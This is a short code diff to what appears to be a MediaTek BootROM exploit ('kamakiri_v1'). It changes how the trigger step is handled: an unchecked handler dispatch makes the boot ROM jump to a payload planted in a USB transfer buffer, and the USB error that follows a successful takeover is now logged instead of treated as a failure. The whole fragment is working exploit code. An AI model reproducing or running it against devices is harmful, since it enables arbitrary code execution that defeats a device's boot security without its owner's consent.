@@ -19,6 +19,8 @@ This module implements the v1 flow.
 from common import from_bytes
 from logger import log
 
+import usb.core
+
 PAYLOAD_ADDRESS = 0x100A00
 WATCHDOG = 0x10007000
 TRIGGER_INDEX = 0xCC
@@ -66,5 +68,11 @@ def kamakiri_v1(device, payload: bytes) -> None:
         ) from error
 
     # Trigger: unchecked if_info[wIndex] handler dispatch jumps to the
-    # payload address planted in the TX buffer.
-    udev.ctrl_transfer(0xA1, 0, 0, TRIGGER_INDEX, 0)
+    # payload address planted in the TX buffer.  The BROM never ACKs this
+    # control request when the payload takes over (that is the exploit
+    # working), so treat every USBError here as "trigger sent" and let the
+    # stage-1 sync read below decide the outcome — same as bypass_utility.
+    try:
+        udev.ctrl_transfer(0xA1, 0, 0, TRIGGER_INDEX, 0)
+    except usb.core.USBError as error:
+        log("Trigger transfer: {}".format(error))
